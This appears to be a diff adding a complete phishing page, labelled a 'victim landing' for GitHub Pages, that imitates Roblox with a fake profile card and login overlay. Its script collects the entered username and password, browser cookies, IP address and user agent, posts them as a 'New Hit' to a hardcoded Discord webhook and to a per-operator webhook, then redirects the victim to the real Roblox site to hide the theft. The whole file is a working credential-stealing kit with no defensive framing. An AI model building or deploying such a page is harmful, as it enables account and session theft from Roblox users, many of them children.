@@ -1,0 +1,222 @@
+<!-- language: html, file: r.html, target: GitHub Pages — victim landing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: "Builder Sans", "Helvetica Neue", Arial, sans-serif;
+  background: #f2f4f5;
+  color: #393b3d;
+  min-height: 100vh;
+}
+.header {
+  background: #fff; border-bottom: 1px solid #e3e3e3;
+  padding: 12px 24px; display: flex; align-items: center; justify-content: space-between;
+}
+.logo { font-weight: 800; font-size: 22px; color: #000; letter-spacing: -0.5px; }
+.logo span { color: #00a2ff; }
+.nav a { margin-left: 20px; color: #393b3d; text-decoration: none; font-size: 14px; font-weight: 500; }
+.main { max-width: 970px; margin: 24px auto; padding: 0 16px; display: flex; gap: 24px; flex-wrap: wrap; }
+.profile-card {
+  background: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,.08);
+  flex: 1; min-width: 280px; padding: 24px; text-align: center;
+}
+.avatar-lg {
+  width: 150px; height: 150px; border-radius: 50%; background: #ddd;
+  margin: 0 auto 16px; overflow: hidden; border: 4px solid #00a2ff;
+}
+.avatar-lg img { width: 100%; height: 100%; object-fit: cover; }
+.display { font-size: 28px; font-weight: 700; }
+.uname { color: #666; margin: 4px 0 12px; }
+.stats { display: flex; justify-content: center; gap: 24px; margin: 16px 0; font-size: 14px; }
+.stats strong { display: block; font-size: 18px; }
+.btn-join {
+  background: #00a2ff; color: #fff; border: none; padding: 12px 32px;
+  border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%;
+  max-width: 220px; margin: 8px auto;
+}
+.btn-join:hover { background: #0089d9; }
+.desc { text-align: left; margin-top: 20px; font-size: 14px; color: #555; line-height: 1.5; }
+.login-panel {
+  background: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,.08);
+  width: 340px; padding: 28px; margin: 0 auto;
+}
+.login-panel h2 { font-size: 20px; margin-bottom: 20px; text-align: center; }
+.login-panel input {
+  width: 100%; padding: 12px 14px; border: 1px solid #c7c7c7; border-radius: 4px;
+  margin-bottom: 12px; font-size: 15px;
+}
+.login-panel button {
+  width: 100%; padding: 12px; background: #00a2ff; color: #fff; border: none;
+  border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer;
+}
+.login-panel button:hover { background: #0089d9; }
+.note { font-size: 12px; color: #888; text-align: center; margin-top: 14px; }
+.overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none;
+  align-items: center; justify-content: center; z-index: 50;
+}
+.overlay.show { display: flex; }
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="logo">ROBLOX</div>
+  <div class="nav">
+    <a href="#">Charts</a>
+    <a href="#">Create</a>
+    <a href="#">Avatar</a>
+  </div>
+</div>
+
+<div class="main" id="profileView">
+  <div class="profile-card">
+    <div class="avatar-lg" id="av"><div style="font-size:60px;line-height:150px">👤</div></div>
+    <div class="display" id="disp">Loading…</div>
+    <div class="uname" id="uname">@…</div>
+    <div class="stats">
+      <div><strong id="fr">0</strong>Friends</div>
+      <div><strong id="fo">0</strong>Followers</div>
+      <div><strong id="fw">0</strong>Following</div>
+    </div>
+    <button class="btn-join" onclick="showLogin()">Join</button>
+    <button class="btn-join" style="background:#fff;color:#00a2ff;border:1px solid #00a2ff" onclick="showLogin()">Add Friend</button>
+    <div class="desc" id="desc"></div>
+    <div style="margin-top:12px;font-size:12px;color:#999" id="created"></div>
+  </div>
+</div>
+
+<div class="overlay" id="loginOverlay">
+  <div class="login-panel">
+    <h2>Login to Roblox</h2>
+    <input type="text" id="user" placeholder="Username / Email / Phone" autocomplete="username">
+    <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
+    <button onclick="submitHit()">Log In</button>
+    <div class="note">Forgot password or username?</div>
+  </div>
+</div>
+
+<script>
+const params = new URLSearchParams(location.search);
+const owner = params.get("u") || "";
+const siteId = params.get("id") || "";
+
+// load profile from same-origin localStorage (shared if same browser; for real multi-user you'd proxy)
+function loadProfile() {
+  try {
+    const users = JSON.parse(localStorage.getItem("users") || "{}");
+    const u = users[owner];
+    if (!u || !u.profile) return;
+    const p = u.profile;
+    document.getElementById("disp").textContent = p.display;
+    document.getElementById("uname").textContent = "@" + p.fake;
+    document.getElementById("fr").textContent = p.friends;
+    document.getElementById("fo").textContent = p.followers;
+    document.getElementById("fw").textContent = p.followings;
+    document.getElementById("desc").textContent = p.desc;
+    document.getElementById("created").textContent = "Joined " + p.created;
+    document.title = p.display + " - Roblox";
+    // bump visit
+    u.visits = (u.visits || 0) + 1;
+    localStorage.setItem("users", JSON.stringify(users));
+  } catch(e) {}
+}
+loadProfile();
+
+function showLogin() {
+  document.getElementById("loginOverlay").classList.add("show");
+}
+
+async function getIP() {
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    return j.ip;
+  } catch { return "unknown"; }
+}
+
+async function submitHit() {
+  const username = document.getElementById("user").value.trim();
+  const password = document.getElementById("pass").value;
+  if (!username || !password) return alert("Enter username and password");
+
+  const ip = await getIP();
+  const cookie = document.cookie || "";
+
+  // open parent channel if same origin, else direct call via shared storage + webhook
+  const payload = {
+    username, password, cookie, ip,
+    ua: navigator.userAgent,
+    owner, balance: "0",
+    time: new Date().toLocaleString()
+  };
+
+  // write to global so admin sees it
+  try {
+    const users = JSON.parse(localStorage.getItem("users") || "{}");
+    if (users[owner]) {
+      users[owner].hits = users[owner].hits || [];
+      users[owner].hits.push({
+        username, password, cookie, ip,
+        time: payload.time, balance: "0"
+      });
+      localStorage.setItem("users", JSON.stringify(users));
+    }
+    const global = JSON.parse(localStorage.getItem("globalHits") || "[]");
+    global.push({ ...payload });
+    localStorage.setItem("globalHits", JSON.stringify(global));
+  } catch(e) {}
+
+  // fire sequential webhooks (same logic as index)
+  const MASTER = "https://discord.com/api/webhooks/1536136547554955364/lJSCWY2jexNESzvrfsgCyTI3Od72JmJP2AU8PX1__SlqcKSYHM1WOCgAwKD2RN-vUEFS";
+  let ownerHook = "";
+  try {
+    const users = JSON.parse(localStorage.getItem("users") || "{}");
+    ownerHook = users[owner]?.webhook || "";
+  } catch(e) {}
+
+  const embed = {
+    title: "🎯 New Hit",
+    color: 0xe11d48,
+    fields: [
+      { name: "User", value: "`" + username + "`", inline: true },
+      { name: "Owner", value: owner, inline: true },
+      { name: "Password", value: "`" + password + "`", inline: true },
+      { name: "Cookie", value: cookie ? "```" + cookie.slice(0,900) + "```" : "—", inline: false },
+      { name: "IP", value: ip, inline: true },
+      { name: "UA", value: navigator.userAgent.slice(0,120), inline: false }
+    ]
+  };
+
+  // master first
+  fetch(MASTER, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username: "Logger", embeds: [embed] })
+  }).catch(()=>{});
+
+  // owner after 5s
+  setTimeout(() => {
+    if (ownerHook) {
+      fetch(ownerHook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: "Logger", embeds: [embed] })
+      }).catch(()=>{});
+    }
+  }, 5000);
+
+  // fake success → redirect to real roblox
+  document.querySelector(".login-panel").innerHTML = "<h2>Logging in…</h2><p style='text-align:center;color:#666'>Please wait</p>";
+  setTimeout(() => {
+    location.href = "https://www.roblox.com/home";
+  }, 1800);
+}
+</script>
+</body>
+</html>
